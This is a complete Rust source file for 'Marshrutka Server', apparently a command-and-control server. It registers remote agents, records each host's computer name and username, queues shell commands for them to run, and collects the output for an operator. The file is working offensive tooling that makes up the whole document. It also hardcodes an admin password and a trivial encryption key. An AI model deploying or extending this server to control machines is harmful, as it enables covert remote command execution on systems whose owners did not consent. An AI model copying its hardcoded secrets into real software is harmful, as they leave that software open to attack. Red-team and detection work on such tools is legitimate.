use chrono::Utc;
use clap::{App, Arg};
use colored::Colorize;
use fnv::FnvHasher;
use orion::aead::{open, SecretKey};
use serde::Deserialize;
use serde::Serialize;
use serde_json::{json, Result as JsonResult, Value};
use std::collections::hash_map::Entry;
use std::collections::HashMap;
use std::hash::Hasher;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;

extern crate fnv;

#[allow(dead_code)]
#[derive(Debug, Clone, Serialize, Deserialize)]
struct AgentInfo {
    id: u32,
    computer_name: Value,
    username: Value,
    last_connection_timestamp: Option<String>,
}

#[allow(dead_code)]
#[derive(Debug, Serialize, Deserialize)] // Add Serialize and Deserialize here
struct CommandInfo {
    command_type: String,
    command: String,
    data: HashMap<String, String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct CommandOutput {
    agent_id: u32,
    output: String,
}

fn handle_client(
    mut stream: TcpStream,
    command_store: Arc<Mutex<HashMap<u32, CommandInfo>>>,
    agent_store: Arc<Mutex<HashMap<u32, AgentInfo>>>,
    command_output_store: Arc<Mutex<Vec<CommandOutput>>>,
) {
    loop {
        let mut buffer = vec![0; 500000];
        match stream.read(&mut buffer) {
            Ok(bytes_read) if bytes_read == 0 => break,
            Ok(bytes_read) => {
                // Define your hardcoded key as a byte array
                let hardcoded_key: [u8; 32] = [
                    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D,
                    0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
                    0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
                ];

                let secret_key = SecretKey::from_slice(&hardcoded_key).unwrap();
                match open(&secret_key, &buffer[0..bytes_read]) {
                    Ok(decrypted_message) => {
                        // Successfully decrypted the message
                        let decrypted_str = String::from_utf8_lossy(&decrypted_message);
                        debug(format!("Decrypted Message: {}", decrypted_str));

                        let parsed_message: JsonResult<Value> =
                            serde_json::from_str(&decrypted_str);
                        debug(format!("Received: {}", decrypted_str));

                        match parsed_message {
                            Ok(success_value) => {
                                let mut agent_exists: bool = false;
                                let mut response = json!({});
                                let mut is_admin = false;

                                if let Some(password) = success_value["password"].as_str() {
                                    debug(String::from("request has password"));
                                    if password != "c7wkzzDlyzLWEspDBzEkU5usC5eIn7Qr" {
                                        debug(String::from("password invalid"));
                                        response = json!({
                                            "error": "Invalid password"
                                        });
                                    } else {
                                        debug(String::from("password valid"));
                                        is_admin = true;
                                    }

                                    if is_admin {
                                        if let Some(action) = success_value["action"].as_str() {
                                            match action {
                                                "get_agents" => {
                                                    let agent_store_lock = agent_store
                                                        .lock()
                                                        .expect("Failed to lock command_store");

                                                    let agents: Vec<&AgentInfo> = agent_store_lock
                                                        .iter()
                                                        .filter_map(|(_id, agent_info)| {
                                                            Some(agent_info)
                                                        })
                                                        .collect();

                                                    response = json!({
                                                        "agents": agents
                                                    });
                                                }
                                                "get_command_outputs" => {
                                                    let mut command_output_store_lock =
                                                        command_output_store.lock().unwrap();
                                                    let agent_messages: Vec<&CommandOutput> =
                                                        command_output_store_lock.iter().collect();

                                                    response = json!({
                                                        "command_output": agent_messages,
                                                    });

                                                    command_output_store_lock.clear();
                                                }
                                                "builtin" => {
                                                    if let Some(agent_id) =
                                                        success_value["agent_id"].as_str()
                                                    {
                                                        let mut command_store_lock =
                                                            match command_store.lock() {
                                                                Ok(lock) => lock,
                                                                Err(poisoned) => {
                                                                    // Handle mutex poisoning
                                                                    let lock =
                                                                        poisoned.into_inner();
                                                                    println!("Thread recovered from mutex poisoning: {:?}", *lock);
                                                                    lock
                                                                }
                                                            };

                                                        let mut map = HashMap::new();

                                                        if let Some(options) =
                                                            success_value["options"].as_object()
                                                        {
                                                            // Iterate over the key-value pairs in the 'options' object and insert them into the HashMap
                                                            for (key, value) in options {
                                                                if let Some(value_str) =
                                                                    value.as_str()
                                                                {
                                                                    map.insert(
                                                                        key.to_string(),
                                                                        value_str.to_string(),
                                                                    );
                                                                } else {
                                                                    // Handle the case where the value is not a string (you can modify this as needed)
                                                                    println!(
                                                                    "Invalid value for key '{}'",
                                                                    key
                                                                );
                                                                }
                                                            }
                                                        }

                                                        let agent_id_u32 =
                                                            agent_id.parse::<u32>().unwrap();

                                                        command_store_lock.insert(
                                                            agent_id_u32,
                                                            CommandInfo {
                                                                command_type: String::from(
                                                                    "builtin",
                                                                ),
                                                                command: String::from(
                                                                    success_value["command"]
                                                                        .as_str()
                                                                        .unwrap(),
                                                                ),
                                                                data: map,
                                                            },
                                                        );

                                                        response = json!({
                                                            "result": "pending"
                                                        });
                                                    }
                                                }
                                                "system" => {
                                                    if let Some(agent_id) =
                                                        success_value["agent_id"].as_str()
                                                    {
                                                        let mut command_store_lock =
                                                            match command_store.lock() {
                                                                Ok(lock) => lock,
                                                                Err(poisoned) => {
                                                                    // Handle mutex poisoning
                                                                    let lock =
                                                                        poisoned.into_inner();
                                                                    println!("Thread recovered from mutex poisoning: {:?}", *lock);
                                                                    lock
                                                                }
                                                            };

                                                        let map = HashMap::new();

                                                        let agent_id_u32 =
                                                            agent_id.parse::<u32>().unwrap();

                                                        command_store_lock.insert(
                                                            agent_id_u32,
                                                            CommandInfo {
                                                                command_type: String::from(
                                                                    "system",
                                                                ),
                                                                command: String::from(
                                                                    success_value["command"]
                                                                        .as_str()
                                                                        .unwrap(),
                                                                ),
                                                                data: map,
                                                            },
                                                        );

                                                        response = json!({
                                                            "result": "pending"
                                                        });
                                                    }
                                                }
                                                _ => {
                                                    response = json!({
                                                        "error": format!("Unknown action {}", action)
                                                    });
                                                }
                                            }
                                        }
                                    }

                                    let response_bytes = serde_json::to_vec(&response)
                                        .expect("Failed to serialize JSON");

                                    if let Err(e) = stream.write_all(&response_bytes) {
                                        eprintln!("Error writing to agent: {}", e);
                                        break;
                                    }

                                    return;
                                }

                                if let Some(id_str) = success_value["id"].as_str() {
                                    let mut hasher = FnvHasher::default();
                                    hasher.write(id_str.as_bytes());
                                    let hash_value = hasher.finish();
                                    let u32_value = hash_value as u32;

                                    // Check if the agent exists in the HashMap
                                    agent_exists = {
                                        let agent_store_lock =
                                            agent_store.lock().expect("Failed to lock agent_store");
                                        agent_store_lock.contains_key(&u32_value)
                                    };
                                }

                                // Unathenticated calls
                                if !agent_exists {
                                    if let Some(action) = success_value["action"].as_str() {
                                        match action {
                                            "register" => {
                                                if let Some(id_str) = success_value["id"].as_str() {
                                                    let mut hasher = FnvHasher::default();
                                                    hasher.write(id_str.as_bytes());
                                                    let hash_value = hasher.finish();
                                                    let u32_value = hash_value as u32;

                                                    let computer_name =
                                                        success_value["computer_name"].clone();
                                                    let username =
                                                        success_value["username"].clone();
                                                    let mut agent_store_lock = agent_store
                                                        .lock()
                                                        .expect("Failed to lock agent_store");

                                                    let current_time = Utc::now(); // Get the current UTC time
                                                    let timestamp = current_time.to_rfc3339();

                                                    agent_store_lock.insert(
                                                        u32_value,
                                                        AgentInfo {
                                                            id: u32_value,
                                                            computer_name,
                                                            username,
                                                            last_connection_timestamp: Some(
                                                                timestamp.clone(),
                                                            ),
                                                        },
                                                    );

                                                    debug(format!(
                                                        "Stored new agent: {}",
                                                        u32_value
                                                    ));
                                                    agent_exists = true;

                                                    response = json!({
                                                        "result": "success"
                                                    });
                                                } else {
                                                    response = json!({
                                                        "error": "Invalid id"
                                                    });
                                                }
                                            }
                                            _ => {
                                                response = json!({
                                                    "error": format!("Unknown action {}", action)
                                                });
                                            }
                                        }
                                    }
                                }

                                // Non-admin calls
                                if let Some(action) = success_value["action"].as_str() {
                                    match action {
                                        "ping" => {
                                            if !agent_exists {
                                                response = json!({
                                                    "error": "no_agent"
                                                });

                                                let response_bytes = serde_json::to_vec(&response)
                                                    .expect("Failed to serialize JSON");

                                                if let Err(e) = stream.write_all(&response_bytes) {
                                                    eprintln!("Error writing to agent: {}", e);
                                                    break;
                                                }

                                                return;
                                            }

                                            if let Some(id_str) = success_value["id"].as_str() {
                                                let mut hasher = FnvHasher::default();
                                                hasher.write(id_str.as_bytes());
                                                let id_hash = hasher.finish() as u32; // Hash id_str to get the agent ID

                                                let mut agent_store_lock = agent_store
                                                    .lock()
                                                    .expect("Failed to lock agent_store");

                                                debug(format!(
                                                    "Searching for agent with ID: {}",
                                                    id_hash
                                                ));

                                                // Check if the agent exists in the HashMap
                                                if let Some(agent) = agent_store_lock.get(&id_hash)
                                                {
                                                    debug(format!("Agent found: {:?}", agent));

                                                    // Update the agent's last connection timestamp
                                                    if let Some(agent) =
                                                        agent_store_lock.get_mut(&id_hash)
                                                    {
                                                        agent.last_connection_timestamp =
                                                            Some(Utc::now().to_string());
                                                    }

                                                    let mut command_store_lock = match command_store
                                                        .lock()
                                                    {
                                                        Ok(lock) => lock,
                                                        Err(poisoned) => {
                                                            // Handle mutex poisoning
                                                            let lock = poisoned.into_inner();
                                                            println!("Thread recovered from mutex poisoning: {:?}", *lock);
                                                            lock
                                                        }
                                                    };

                                                    let commands: Vec<&CommandInfo> =
                                                        command_store_lock
                                                            .iter()
                                                            .filter_map(|(id, command_info)| {
                                                                if *id == id_hash {
                                                                    Some(command_info)
                                                                } else {
                                                                    None
                                                                }
                                                            })
                                                            .collect();

                                                    response = json!({
                                                        "commands": commands,
                                                    });

                                                    // Clean up
                                                    match command_store_lock.entry(id_hash) {
                                                        Entry::Occupied(entry) => {
                                                            debug(format!("Removing commands for agent with ID: {}", id_hash));
                                                            entry.remove(); // Remove all commands associated with this agent
                                                        }
                                                        Entry::Vacant(_) => {
                                                            debug(format!("No commands found for agent with ID: {}", id_hash));
                                                        }
                                                    }
                                                } else {
                                                    debug(format!(
                                                        "Agent not found for ID: {}",
                                                        id_hash
                                                    ));
                                                    response = json!({
                                                        "error": "Agent not found"
                                                    });
                                                }
                                            } else {
                                                response = json!({
                                                    "error": "Invalid id"
                                                });
                                            }
                                        }

                                        "commandResult" => {
                                            if !agent_exists {
                                                response = json!({
                                                    "error": "no_agent"
                                                });

                                                let response_bytes = serde_json::to_vec(&response)
                                                    .expect("Failed to serialize JSON");

                                                if let Err(e) = stream.write_all(&response_bytes) {
                                                    eprintln!("Error writing to agent: {}", e);
                                                    break;
                                                }

                                                return;
                                            }

                                            // let command =
                                            //     success_value["command"].as_str().unwrap();

                                            let id = success_value["id"].as_str().unwrap();

                                            if let Some(stdout_str) =
                                                success_value["output"].as_str()
                                            {
                                                let mut hasher = FnvHasher::default();
                                                hasher.write(id.as_bytes());
                                                let id_hash = hasher.finish() as u32; // Hash id_str to get the agent ID

                                                let mut agent_store_lock = agent_store
                                                    .lock()
                                                    .expect("Failed to lock agent_store");

                                                // Check if the agent exists in the HashMap
                                                if let Some(agent) = agent_store_lock.get(&id_hash)
                                                {
                                                    debug(format!("Agent found: {:?}", agent));

                                                    // Update the agent's last connection timestamp
                                                    if let Some(agent) =
                                                        agent_store_lock.get_mut(&id_hash)
                                                    {
                                                        agent.last_connection_timestamp =
                                                            Some(Utc::now().to_string());
                                                    }

                                                    // Store the command output message in the shared data structure
                                                    let command_output = CommandOutput {
                                                        agent_id: id_hash,
                                                        output: stdout_str.to_string(),
                                                    };

                                                    let mut command_output_store_lock =
                                                        command_output_store.lock().unwrap();
                                                    command_output_store_lock.push(command_output);
                                                }
                                            }
                                        }
                                        _ => {
                                            response = json!({
                                                "error": format!("Unknown action {}", action)
                                            });
                                        }
                                    }
                                } else {
                                    response = json!({
                                        "error": "Missing action"
                                    });
                                }

                                let response_bytes = serde_json::to_vec(&response)
                                    .expect("Failed to serialize JSON");

                                if let Err(e) = stream.write_all(&response_bytes) {
                                    eprintln!("Error writing to agent: {}", e);
                                    break;
                                }
                            }
                            Err(error) => {
                                println!("Error: {:?}", error);
                            }
                        }
                    }
                    Err(error) => {
                        // Handle the error, log it, or return an error response to the agent
                        eprintln!("Error decrypting message: {:?}", error);
                        // Optionally, return an error response to the agent
                        // stream.write_all(b"Error decrypting message")?;
                    }
                }
            }
            Err(e) => {
                eprintln!("Error reading from agent: {}", e);
                break;
            }
        }
    }
}

fn main() {
    let ascii_art = r#"
                         _                _   _         
    /\/\   __ _ _ __ ___| |__  _ __ _   _| |_| | ____ _ 
   /    \ / _` | '__/ __| '_ \| '__| | | | __| |/ / _` |
  / /\/\ \ (_| | |  \__ \ | | | |  | |_| | |_|   < (_| |
  \/    \/\__,_|_|  |___/_| |_|_|   \__,_|\__|_|\_\__,_|
    "#;

    println!(
        "{}\n  Server version {} | Created by Nathan Malcolm, use responsibly!\n",
        ascii_art.red(),
        env!("CARGO_PKG_VERSION")
    );

    let matches = App::new("Marshrutka Server")
        .arg(
            Arg::with_name("address")
                .short("a")
                .long("address")
                .value_name("ADDRESS")
                .default_value("127.0.0.1")
                .help("Sets the server address")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("port")
                .short("p")
                .long("port")
                .value_name("PORT")
                .default_value("8000")
                .help("Sets the server port")
                .takes_value(true),
        )
        .get_matches();

    let address = matches.value_of("address").unwrap();
    let port = matches.value_of("port").unwrap();

    let listener = TcpListener::bind(format!("{}:{}", address, port)).expect("Failed to bind");
    println!("Server listening on {}:{}", address, port);
    println!("");
    println!("We'll take it from here.");

    let command_store: Arc<Mutex<HashMap<u32, CommandInfo>>> = Arc::new(Mutex::new(HashMap::new()));
    let agent_store: Arc<Mutex<HashMap<u32, AgentInfo>>> = Arc::new(Mutex::new(HashMap::new()));
    let command_output_store: Arc<Mutex<Vec<CommandOutput>>> = Arc::new(Mutex::new(Vec::new()));

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let command_store_clone = command_store.clone();
                let agent_store_clone = agent_store.clone();
                let command_output_store_clone = command_output_store.clone();
                thread::spawn(move || {
                    handle_client(
                        stream,
                        command_store_clone,
                        agent_store_clone,
                        command_output_store_clone,
                    )
                });
            }
            Err(e) => {
                eprintln!("Error accepting connection: {}", e);
            }
        }
    }
}

fn debug(message: String) {
    #[cfg(debug_assertions)]
    println!("{}", format!("DEBUG: {}", message).blue());
}
